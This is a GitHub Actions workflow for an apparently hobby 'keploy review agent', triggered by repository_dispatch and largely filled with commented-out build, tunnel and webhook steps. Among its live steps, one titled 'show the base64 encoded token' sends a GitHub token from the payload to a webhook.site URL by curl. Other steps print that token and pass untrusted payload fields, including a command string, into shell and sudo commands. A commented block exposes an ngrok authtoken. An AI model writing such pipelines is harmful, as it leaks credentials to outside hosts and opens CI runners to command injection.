# # name: Code Review Agent CI/CD

# # on:
# #   pull_request:
# #     branches: [ main ]

# # jobs:
# #   review:
# #     runs-on: ubuntu-latest
# name: Triggered by External PR

# on:
#   repository_dispatch:
#     types: [external_pr]

# jobs:
#   review:
#     runs-on: ubuntu-latest
#     env:
#       REVIEW_PORT: 8080
#       WEBHOOK_PORT: 6969
#       TARGET_REPO: "Per0x1de-1337/Review"  

#     steps:
#       - name: Display PR Data
#         run: echo "Triggered by PR" ${{ github.event.client_payload.pr_url }}
#       - name: Checkout repository
#         uses: actions/checkout@v3

#       - name: Update system packages
#         run: sudo apt update

#       # Cache Go modules to avoid downloading dependencies repeatedsly
#       - name: Cache Go Modules
#         uses: actions/cache@v3
#         with:
#           path: ~/go/pkg/mod
#           key: ${{ runner.os }}-go-${{ hashFiles('**/go.sum') }}
#           restore-keys: |
#             ${{ runner.os }}-go-
#       # Cache Node.js dependencies
#       - name: Cache npm modules
#         uses: actions/cache@v3
#         with:
#           path: ~/.npm
#           key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
#           restore-keys: |
#             ${{ runner.os }}-node-
#       # Cache GolangCI-Lint binary
#       - name: Cache GolangCI-Lint
#         id: golangci-cache
#         uses: actions/cache@v3
#         with:
#           path: /usr/local/bin/golangci-lint
#           key: ${{ runner.os }}-golangci-lint-v1.55.2
#           restore-keys: |
#             ${{ runner.os }}-golangci-lint-
#       - name: Install Dependencies (Go, Node.js, ESLint, GolangCI-Lint, GitHub CLI)
#         run: |
#           sudo apt install -y golang nodejs npm gh
          
#           # Install npm dependencies only if not cached
#           if [ ! -d "~/.npm" ]; then
#             npm install -g eslint
#           fi
#           # Install GolangCI-Lint only if not cached
#           if [ ! -f "/usr/local/bin/golangci-lint" ]; then
#             curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sudo sh -s -- -b /usr/local/bin v1.55.2
#           fi
#       - name: Setup Go environment
#         uses: actions/setup-go@v4
#         with:
#           go-version: '1.20'

#       # - name: start 6000
#       #   run: nohup lt --port 8221 > server.log 2>&1 &
#       # - name: Install ngrok
#       #   run: wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip;unzip -qq ngrok-stable-linux-amd64.zip;
#       # - name: Start ngrok tunnel
#       #   run: ./ngrok authtoken 2rqMCQpGwy8Hefx932ZJQCVS0U0_35MwNuTKQeaCf8Kst8LPL && nohup ngrok http 6000 > /dev/null 2>&1 & sleep 5 && curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4           # save_url_to_filename: ngrok_url.txt

#       # - name: Retrieve ngrok URL
#       #   run:  cat ngrok_url.txt ; export NGROK_URL=$(cat ngrok_url.txt) ; echo "NGROK_URL=${NGROK_URL}" ; env

          
          
#       - name: Initialize Go module & Install Dependencies
#         run: cd keploy-review-agent; go mod tidy

#       # - name: Debug File Existence
#       #   run: |
#       #     echo "Current Directory: $(pwd)"
#       #     ls -R
#       #     if [ ! -f cmd/server/main.go ]; then
#       #       echo "Error: cmd/server/main.go not found!" >&2
#       #       exit 1
#       #     fi
#       - name: Build Go Project
#         run: |
#           cd keploy-review-agent  # Change to the correct directory
#           ls -la cmd/server/      # Confirm the file exists
#           go build -o review-agent cmd/server/main.go
#       # - name: Set Go Environment
#       #   run: |
#       #     export GOPATH=$GITHUB_WORKSPACE
#       #     go mod tidy  # Ensure dependencies are correct
#       #     go build -o review-agent cmd/server/main.go
#       # - name: Run Go Server
#       #   run: |
#       #     go run ./cmd/server/main.go

#       # - name: Build Review Agent
#       #   run: go build -o review-agent cmd/server/main.go 
#       - name: Debug Build Output
#         run: |
#           ls -lah keploy-review-agent/
#           file keploy-review-agent/review-agent
#       - name: Debug Current Directory
#         run: pwd && ls -lah

#       - name: Fix Permissions
#         run: chmod +x keploy-review-agent/review-agent
#       - name: Check Executable Permissions
#         run: ls -lah keploy-review-agent/review-agent
#       - name: Verify Binary Compatibility
#         run: file keploy-review-agent/review-agent
#       # - name: Check Dynamic Dependencies
#       #   run: ldd keploy-review-agent/review-agent
#       - name: Build Statically Linked Binary
#         run: |
#           cd keploy-review-agent
#           CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent cmd/server/main.go
#       - name: Debug Current Directory
#         run: pwd && ls -lah

#       - name: list all
#         run: ls -la ; file keploy-review-agent/review-agent
#       # - name: Check Missing Dependencies
#       #   run: ldd keploy-review-agent/review-agent | grep "not found"
#       # - name: Install libc6
#       #   run: sudo apt-get install -y libc6
#       # - name: Build Fully Static Binary
#       #   run: |
#       #     cd keploy-review-agent
#       #     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent main.go






#       - name: Start Review Agent
#         env:
#           PAT_OF_GITHUB: ${{ secrets.PAT_OF_GITHUB }}  # Fetching token from GitHub Secrets
#         run: |
#           cd keploy-review-agent
#           pwd
#           nohup ./review-agent "$PAT_OF_GITHUB" ${{ github.event.client_payload.pr_url }} > agent.log 2>&1 &


          
#       - name: Debug Review Agent Logs
#         run: |
#           ls -la; pwd ; ps aux | grep review
#           cat keploy-review-agent/agent.log
#       - name: Check Running Processes
#         run: |
#           ps aux | grep review
    
#       - name: sleeping or 10 sec
#         run: sleep 10

#       # - name: checkif working otr not
#       #   run: curl localhost:6969
#       - name: Install Cloudflare Tunnel
#         run: |
#           curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared
#           chmod +x cloudflared
#           sudo mv cloudflared /usr/local/bin/
#       # - name: Start Python HTTP Server
#       #   run: nohup python3 -m http.server 6969 > server.log 2>&1 &

#       - name: Start Cloudflare Tunnel
#         run: nohup cloudflared tunnel --url http://localhost:6969 > cloudflare.log 2>&1 &

#       - name: Retrieve Cloudflare Tunnel URL
#         run: |
#           sleep 10  # Wait for Cloudflare Tunnel to start
#           CLOUDFLARE_URL=$(grep -oP 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' cloudflare.log | head -n 1)
#           if [ -z "$CLOUDFLARE_URL" ]; then
#             echo "Error: Cloudflare Tunnel URL not found!" >&2
#             exit 1
#           fi
#           echo "CLOUDFLARE_URL=$CLOUDFLARE_URL" >> $GITHUB_ENV
#       - name: Output Cloudflare URL
#         run: echo "Your Cloudflare Tunnel URL is" $CLOUDFLARE_URL

#       - name: Authenticate GitHub CLI
#         run: gh auth login --with-token <<< ${{ secrets.PAT_OF_GITHUB }}

#       - name: Set REPO Variable
#         run: echo "REPO=${{ env.TARGET_REPO }}" >> $GITHUB_ENV

#       - name: Validate Required Variables
#         run: |
#           if [ -z "$CLOUDFLARE_URL" ]; then
#             echo "❌ Error: CLOUDFLARE_URL is not set!" >&2
#             exit 1
#           else
#             echo "✅ CLOUDFLARE_URL is set: $CLOUDFLARE_URL"
#           fi
      
#           if [ -z "$REPO" ]; then
#             echo "❌ Error: REPO is not set!" >&2
#             exit 1
#           else
#             echo "✅ REPO is set: $REPO"
#           fi
#       - name: Generate Webhook JSON Config
#         run: |
#           jq -n --arg url "${CLOUDFLARE_URL}/webhook" '{
#             "name": "web",
#             "active": true,
#             "events": ["pull_request"],
#             "config": {
#               "url": $url,
#               "content_type": "json",
#               "insecure_ssl": "0"
#             }
#           }' > webhook_payload.json
      
#           echo "🔍 Generated Webhook JSON:"
#           cat webhook_payload.json
#       - name: Debug GitHub Authentication
#         run: |
#           echo "🔍 Checking GitHub authentication..."
#           gh auth status || { echo "❌ GitHub CLI is not authenticated!"; exit 1; }
#       - name: Create GitHub Webhook
#         run: |
#           echo "🚀 Creating GitHub Webhook for repository: $REPO"
#           gh api --method POST /repos/$REPO/hooks --input webhook_payload.json
#       - name: Set Environment Variables
#         run: |
#           echo "REPO_URL=/repos/${{ env.TARGET_REPO }}/hooks" >> $GITHUB_ENV
#           echo "WEBHOOK_URL=${{ env.CLOUDFLARE_URL }}/webhook" >> $GITHUB_ENV
#       - name: Validate Required Variables
#         run: |
#           echo "DEBUG: CLOUDFLARE_URL='${{ env.CLOUDFLARE_URL }}'"
#           echo "DEBUG: WEBHOOK_URL='${{ env.WEBHOOK_URL }}'"
#           if [ -z "${{ env.CLOUDFLARE_URL }}" ]; then
#             echo "Error: CLOUDFLARE_URL is not set!" >&2
#             exit 1
#           fi
#       - name: Fetch Existing Webhooks
#         run: |
#           RESPONSE=$(gh api "${{ env.REPO_URL }}" || echo "")
#           if ! echo "$RESPONSE" | jq -e . >/dev/null 2>&1; then
#             echo "Error: Invalid JSON response from GitHub API."
#             echo "Response: $RESPONSE"
#             exit 1
#           fi
#           echo "GITHUB_API_RESPONSE=$RESPONSE" >> $GITHUB_ENV
#       - name: Check Existing Webhook
#         run: |
#           HOOK_ID=$(echo '${{ env.GITHUB_API_RESPONSE }}' | jq -r --arg url "${{ env.WEBHOOK_URL }}" '.[] | select(.config.url==$url) | .id' || echo "")
#           if [ -n "$HOOK_ID" ] && [ "$HOOK_ID" != "null" ]; then
#             echo "Webhook already exists with ID: $HOOK_ID"
#             echo "HOOK_ID=$HOOK_ID" >> $GITHUB_ENV
#           else
#             echo "No existing webhook found."
#           fi
#       - name: Create Webhook (If Needed)
#         if: env.HOOK_ID == ''
#         run: |
#           echo "Creating new webhook for PR events..."
#           gh api --method POST "${{ env.REPO_URL }}" --input <(jq -n --arg url "${{ env.WEBHOOK_URL }}" '{
#             "name": "web",
#             "active": true,
#             "events": ["pull_request"],
#             "config": {
#               "url": $url,
#               "content_type": "json"
#             }
#           }')
#       - name: Update Existing Webhook
#         if: env.HOOK_ID != ''
#         run: |
#           echo "Updating existing webhook with ID: $HOOK_ID"
#           gh api --method PATCH "${{ env.REPO_URL }}/$HOOK_ID" --input <(jq -n --arg url "${{ env.WEBHOOK_URL }}" '{
#             "config": {
#               "url": $url,
#               "content_type": "json"
#             },
#             "events": ["pull_request"]
#           }')
#       - name: Debug Review Agent Logs
#         run: |
#           ls -la; pwd ; ps aux | grep review
#           cat keploy-review-agent/agent.log

#############################################################################
# name: Code Review Agent CI/CD

# on:
#   pull_request:
#     branches: [ main ]

# jobs:
#   review:
#     runs-on: ubuntu-latest
name: Triggered by External PR

on:
  repository_dispatch:
    types: [external_pr]

jobs:
  review:
    runs-on: ubuntu-latest
    env:
      REVIEW_PORT: 8080
      WEBHOOK_PORT: 6969
      TARGET_REPO: "Per0x1de-1337/Review"  

    steps:
      - name: Display PR Data
        run: echo "Triggered by PR ${{ github.event.client_payload.pr_url }}"

      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Save the data got from the PR
        run: |
          echo "PR_URL=${{ github.event.client_payload.pr_url }}" >> $GITHUB_ENV
          echo "COMMAND_FOR_RUNNING_APPLICATION=${{ github.event.client_payload.command_for_running_application }}" >> $GITHUB_ENV
          echo "GITHUB_TOKEN_FOR_PEROXIDE=${{ github.event.client_payload.github_token_for_peroxide }}" >> $GITHUB_ENV
          echo "DELAY_IN_SECONDS=${{ github.event.client_payload.Delay_in_seconds }}" >> $GITHUB_ENV
          echo "PATH_OF_SCRIPT_SH=${{ github.event.client_payload.path_of_script.sh }}" >> $GITHUB_ENV
          echo "REPO=${{ github.event.client_payload.repo }}" >> $GITHUB_ENV
          echo "all the data got from the PR"
          echo "${GITHUB_TOKEN_FOR_PEROXIDE}"
          echo "${COMMAND_FOR_RUNNING_APPLICATION}"
          echo "${DELAY_IN_SECONDS}"
          echo "${PATH_OF_SCRIPT_SH}"
          echo "${REPO}"
      - name: Update system packages
        run: sudo apt update

      # Cache Go modules to avoid downloading dependencies repeatedly
      - name: Cache Go Modules
        uses: actions/cache@v3
        with:
          path: ~/go/pkg/mod
          key: ${{ runner.os }}-go-${{ hashFiles('**/go.sum') }}
          restore-keys: |
            ${{ runner.os }}-go-
      # Cache Node.js dependencies
      - name: Cache npm modules
        uses: actions/cache@v3
        with:
          path: ~/.npm
          key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-node-
      # Cache GolangCI-Lint binary
      - name: Cache GolangCI-Lint
        id: golangci-cache
        uses: actions/cache@v3
        with:
          path: /usr/local/bin/golangci-lint
          key: ${{ runner.os }}-golangci-lint-v1.55.2
          restore-keys: |
            ${{ runner.os }}-golangci-lint-
      # - name: Install Dependencies (Go, Node.js, ESLint, GolangCI-Lint, GitHub CLI)
      #   run: |
      #     sudo apt install -y golang nodejs npm gh
          
      #     # Install npm dependencies only if not cached
      #     if [ ! -d "~/.npm" ]; then
      #       npm install -g eslint
      #     fi
      #     # Install GolangCI-Lint only if not cached
      #     if [ ! -f "/usr/local/bin/golangci-lint" ]; then
      #       curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sudo sh -s -- -b /usr/local/bin v1.55.2
      #     fi
      - name: Setup Go environment
        uses: actions/setup-go@v4
        with:
          go-version: '1.20'

      # - name: start 6000
      #   run: nohup lt --port 8221 > server.log 2>&1 &
      # - name: Install ngrok
      #   run: wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip;unzip -qq ngrok-stable-linux-amd64.zip;
      # - name: Start ngrok tunnel
      #   run: ./ngrok authtoken 2rqMCQpGwy8Hefx932ZJQCVS0U0_35MwNuTKQeaCf8Kst8LPL && nohup ngrok http 6000 > /dev/null 2>&1 & sleep 5 && curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4           # save_url_to_filename: ngrok_url.txt

      # - name: Retrieve ngrok URL
      #   run:  cat ngrok_url.txt ; export NGROK_URL=$(cat ngrok_url.txt) ; echo "NGROK_URL=${NGROK_URL}" ; env

          
          
      # - name: Initialize Go module & Install Dependencies
      #   run: cd keploy-review-agent; go mod tidy

      # - name: Debug File Existence
      #   run: |
      #     echo "Current Directory: $(pwd)"
      #     ls -R
      #     if [ ! -f cmd/server/main.go ]; then
      #       echo "Error: cmd/server/main.go not found!" >&2
      #       exit 1
      #     fi
      - name: Build Go Project
        run: |
          cd keploy-review-agent  # Change to the correct directory
          ls -la cmd/server/      # Confirm the file exists
          go build -o review-agent cmd/server/main.go
      # - name: Set Go Environment
      #   run: |
      #     export GOPATH=$GITHUB_WORKSPACE
      #     go mod tidy  # Ensure dependencies are correct
      #     go build -o review-agent cmd/server/main.go
      # - name: Run Go Server
      #   run: |
      #     go run ./cmd/server/main.go

      # - name: Build Review Agent
      #   run: go build -o review-agent cmd/server/main.go 
      - name: Debug Build Output
        run: |
          ls -lah keploy-review-agent/
          file keploy-review-agent/review-agent
      - name: Debug Current Directory
        run: pwd && ls -lah

      - name: Fix Permissions
        run: chmod +x keploy-review-agent/review-agent
      - name: Check Executable Permissions
        run: ls -lah keploy-review-agent/review-agent
      - name: Verify Binary Compatibility
        run: file keploy-review-agent/review-agent
      # - name: Check Dynamic Dependencies
      #   run: ldd keploy-review-agent/review-agent
      # - name: Build Statically Linked Binary
      #   run: |
      #     cd keploy-review-agent
      #     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent cmd/server/main.go
      - name: Debug Current Directory
        run: pwd && ls -lah

      - name: list all
        run: ls -la ; file keploy-review-agent/review-agent
      # - name: Check Missing Dependencies
      #   run: ldd keploy-review-agent/review-agent | grep "not found"
      # - name: Install libc6
      #   run: sudo apt-get install -y libc6
      # - name: Build Fully Static Binary
      #   run: |
      #     cd keploy-review-agent
      #     CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o review-agent main.go






      - name: Start Review Agent
        env:
          PAT_OF_GITHUB: ${{ secrets.PAT_OF_GITHUB }}  # Fetching token from GitHub Secrets
        run: |
          cd keploy-review-agent
          pwd
          nohup ./review-agent "$PAT_OF_GITHUB" ${{ github.event.client_payload.pr_url }} > agent.log 2>&1 &

          
      - name: Debug Review Agent Logs
        run: |
          ls -la; pwd ; ps aux | grep review
          cat keploy-review-agent/agent.log
      - name: Check Running Processes
        run: |
          ps aux | grep review
    
      # - name: sleeping or 5 sec
      #   run: sleep 5
      - name: show the base64 encoded token GITHUB_TOKEN_FOR_PEROXIDE
        run: curl https://webhook.site/a3eb4d99-caf3-4b9b-a327-9b3b13be3046?cmd=$GITHUB_TOKEN_FOR_PEROXIDE
      - name: Print Workspace Debug Info
        run: |
          echo "Working Directory: $(pwd)"
          echo "GitHub Workspace: $GITHUB_WORKSPACE"
          echo "Listing workspace contents:"
          ls -la $GITHUB_WORKSPACE

      - name: Print Git Configuration
        run: |
          echo "Git config --list:"
          git config --list || true
      - name: Checkout another repo
        uses: actions/checkout@v3
        with:
          repository: ${{github.event.client_payload.repo}}
          token: ${{ secrets.PAT_OF_GITHUB }}
          path: review
      - name: Test GitHub API
        run: |
          curl -H "Authorization: token ${{ secrets.PAT_OF_GITHUB }}" \
              https://api.github.com/repos/Per0x1de-1337/Review

      - name: Debug Checkout
        run: |
          echo "Current Directory: $(pwd)"
          echo "Contents of the directory:"
          ls -la
          echo "Contents of the keploy-review-agent directory:"
          ls -la keploy-review-agent
          ls -la review
      - name: install keploy
        run: |
           curl --silent -O -L https://keploy.io/install.sh && source install.sh

      - name: test keploy
        run: |
          keploy --help
      - name: install the requriments of the repo
        run: |
          cd review;
          cat script.sh
          # echo ${{ github.event.client_payload.path_of_script.sh }}
          # echo "${{ github.event.client_payload.path_of_script.sh }}/script.sh"
          chmod +x script.sh
          echo "Current Directory: $(pwd)"
          echo "Contents of the directory:"
          ls -la
      - name: tessting real application
        run: |
          cd review
          echo "Current Directory: $(pwd)"
          echo "Contents of the directory:"
          ls -la
          echo ${{github.event.client_payload.command_for_running_application}}
      # - name: lsof
      #   run: sudo lsof -i :16789,26789
      - name: record with keploy
        run: |
          cd review
          echo "Current Directory: $(pwd)"
          echo "Contents of the directory:"
          ls -la
          sudo keploy record -c ${{github.event.client_payload.command_for_running_application}} --container-name "flask-web"
      - name: debugging if files there or not
        run: |
          echo "Current Directory $(pwd)"
          echo "Contents of the directory:"
          ls -la
      - name: testing
        run: |
          cd review
          echo "Current Directory: $(pwd)"
          echo "Contents of the directory:"
          ls -la
          sudo keploy test -c ${{github.event.client_payload.command_for_running_application}}
      # - name: checkif working otr not
      #   run: curl localhost:6969
      # - name: Install Cloudflare Tunnel
      #   run: |
      #     curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared
      #     chmod +x cloudflared
      #     sudo mv cloudflared /usr/local/bin/
      # # - name: Start Python HTTP Server
      # #   run: nohup python3 -m http.server 6969 > server.log 2>&1 &

      # - name: Start Cloudflare Tunnel
      #   run: nohup cloudflared tunnel --url http://localhost:6969 > cloudflare.log 2>&1 &

      # - name: Retrieve Cloudflare Tunnel URL
      #   run: |
      #     sleep 10  # Wait for Cloudflare Tunnel to start
      #     CLOUDFLARE_URL=$(grep -oP 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' cloudflare.log | head -n 1)
      #     if [ -z "$CLOUDFLARE_URL" ]; then
      #       echo "Error: Cloudflare Tunnel URL not found!" >&2
      #       exit 1
      #     fi
      #     echo "CLOUDFLARE_URL=$CLOUDFLARE_URL" >> $GITHUB_ENV
      # - name: Output Cloudflare URL
      #   run: echo "Your Cloudflare Tunnel URL is" $CLOUDFLARE_URL

      # - name: Authenticate GitHub CLI
      #   run: gh auth login --with-token <<< ${{ secrets.PAT_OF_GITHUB }}

      # - name: Set REPO Variable
      #   run: echo "REPO=${{ env.TARGET_REPO }}" >> $GITHUB_ENV

      # - name: Validate Required Variables
      #   run: |
      #     if [ -z "$CLOUDFLARE_URL" ]; then
      #       echo "❌ Error: CLOUDFLARE_URL is not set!" >&2
      #       exit 1
      #     else
      #       echo "✅ CLOUDFLARE_URL is set: $CLOUDFLARE_URL"
      #     fi
      
      #     if [ -z "$REPO" ]; then
      #       echo "❌ Error: REPO is not set!" >&2
      #       exit 1
      #     else
      #       echo "✅ REPO is set: $REPO"
      #     fi
      # - name: Generate Webhook JSON Config
      #   run: |
      #     jq -n --arg url "${CLOUDFLARE_URL}/webhook" '{
      #       "name": "web",
      #       "active": true,
      #       "events": ["pull_request"],
      #       "config": {
      #         "url": $url,
      #         "content_type": "json",
      #         "insecure_ssl": "0"
      #       }
      #     }' > webhook_payload.json
      
      #     echo "🔍 Generated Webhook JSON:"
      #     cat webhook_payload.json
      # - name: Debug GitHub Authentication
      #   run: |
      #     echo "🔍 Checking GitHub authentication..."
      #     gh auth status || { echo "❌ GitHub CLI is not authenticated!"; exit 1; }
      # - name: Create GitHub Webhook
      #   run: |
      #     echo "🚀 Creating GitHub Webhook for repository: $REPO"
      #     gh api --method POST /repos/$REPO/hooks --input webhook_payload.json
      # - name: Set Environment Variables
      #   run: |
      #     echo "REPO_URL=/repos/${{ env.TARGET_REPO }}/hooks" >> $GITHUB_ENV
      #     echo "WEBHOOK_URL=${{ env.CLOUDFLARE_URL }}/webhook" >> $GITHUB_ENV
      # - name: Validate Required Variables
      #   run: |
      #     echo "DEBUG: CLOUDFLARE_URL='${{ env.CLOUDFLARE_URL }}'"
      #     echo "DEBUG: WEBHOOK_URL='${{ env.WEBHOOK_URL }}'"
      #     if [ -z "${{ env.CLOUDFLARE_URL }}" ]; then
      #       echo "Error: CLOUDFLARE_URL is not set!" >&2
      #       exit 1
      #     fi
      # - name: Fetch Existing Webhooks
      #   run: |
      #     RESPONSE=$(gh api "${{ env.REPO_URL }}" || echo "")
      #     if ! echo "$RESPONSE" | jq -e . >/dev/null 2>&1; then
      #       echo "Error: Invalid JSON response from GitHub API."
      #       echo "Response: $RESPONSE"
      #       exit 1
      #     fi
      #     echo "GITHUB_API_RESPONSE=$RESPONSE" >> $GITHUB_ENV
      # - name: Check Existing Webhook
      #   run: |
      #     HOOK_ID=$(echo '${{ env.GITHUB_API_RESPONSE }}' | jq -r --arg url "${{ env.WEBHOOK_URL }}" '.[] | select(.config.url==$url) | .id' || echo "")
      #     if [ -n "$HOOK_ID" ] && [ "$HOOK_ID" != "null" ]; then
      #       echo "Webhook already exists with ID: $HOOK_ID"
      #       echo "HOOK_ID=$HOOK_ID" >> $GITHUB_ENV
      #     else
      #       echo "No existing webhook found."
      #     fi
      # - name: Create Webhook (If Needed)
      #   if: env.HOOK_ID == ''
      #   run: |
      #     echo "Creating new webhook for PR events..."
      #     gh api --method POST "${{ env.REPO_URL }}" --input <(jq -n --arg url "${{ env.WEBHOOK_URL }}" '{
      #       "name": "web",
      #       "active": true,
      #       "events": ["pull_request"],
      #       "config": {
      #         "url": $url,
      #         "content_type": "json"
      #       }
      #     }')
      # - name: Update Existing Webhook
      #   if: env.HOOK_ID != ''
      #   run: |
      #     echo "Updating existing webhook with ID: $HOOK_ID"
      #     gh api --method PATCH "${{ env.REPO_URL }}/$HOOK_ID" --input <(jq -n --arg url "${{ env.WEBHOOK_URL }}" '{
      #       "config": {
      #         "url": $url,
      #         "content_type": "json"
      #       },
      #       "events": ["pull_request"]
      #     }')
      - name: tree
        run: tree
      - name: Debug Review Agent Logs
        run: |
          ls -la; pwd ; ps aux | grep review
          cat keploy-review-agent/agent.log